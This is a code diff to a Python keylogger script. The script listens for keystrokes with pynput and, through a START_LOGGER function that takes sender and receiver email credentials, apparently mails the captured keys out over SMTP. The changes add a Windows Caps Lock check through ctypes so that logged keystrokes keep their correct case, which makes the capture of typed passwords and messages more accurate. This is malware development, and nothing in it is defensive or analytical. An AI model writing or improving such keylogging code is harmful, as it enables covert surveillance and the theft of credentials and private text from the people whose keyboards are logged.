@@ -1,15 +1,10 @@
 
 import os
-
 import json
 from pynput.keyboard import Key, Listener
 import smtplib, ssl
 import socket   
-    
-   
-    
-    
-
+import ctypes
 import requests
 
 #!# -----------------------------------CONSTANTS----------------------------------- #!#
@@ -250,7 +245,12 @@ class newConfig():
 
             return bcolors.WHITE   
 
-            
+#!# -----------------------------------CAPS-LOCK----------------------------------- #!#
+
+def CapsStatus():
+    import ctypes
+    return True if ctypes.WinDLL("User32.dll").GetKeyState(0x14) else False
+
      
 #!# -----------------------------------LOGGER----------------------------------- #!#
 
@@ -312,6 +312,9 @@ def START_LOGGER(senderEmail,senderPassword,receiverEmail, mode):
         elif str(keypressed).startswith("Key."):
             keypressed = ""
             keys_pressed =- 2
+        
+        if CapsStatus(): keypressed = str(keypressed); keypressed = keypressed.upper()  
+        
         keys.append(str(keypressed))
         keys_pressed += 1
         if keys_pressed > 20 and Key_mode == True:   
